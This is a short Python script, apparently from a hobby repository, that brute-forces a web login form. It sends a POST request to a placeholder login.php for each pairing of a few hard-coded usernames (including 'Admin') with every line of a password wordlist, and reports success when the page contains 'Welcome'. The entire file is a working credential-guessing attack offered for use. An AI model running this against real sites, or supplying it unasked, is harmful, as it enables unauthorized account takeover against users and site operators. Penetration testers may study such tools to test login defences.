import requests 

target = "http://example.com/login.php"

#Edit to the desired usernames
usernames = ["Admin", "User", "aws", "gg"] 

#Specify the passwords-list
passwords = "Passowrds-list.txt" 	

#This needle is the most importat thing to check whether that the request succeded or not (view README)
needle = "Welcome" 	

for username in usernames: # iterate over each username
    for password in open(passwords, 'r'): #inner loop to iterate over all password for that username
        
        password = password.strip("\n").encode()
        
        print("[X] Attempting user:password -> {}:{}".format(username, password.decode()), end='\r', flush=True)
        r = requests.post(target, data={"username": username, "password": password}) #creating the POST request within the username and password
        
		
        if needle.encode() in r.content: # Checking the content depending on the needle 
            print("\n\t [>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
            break
    else:
        print("[X] No password found for '{}'".format(username))
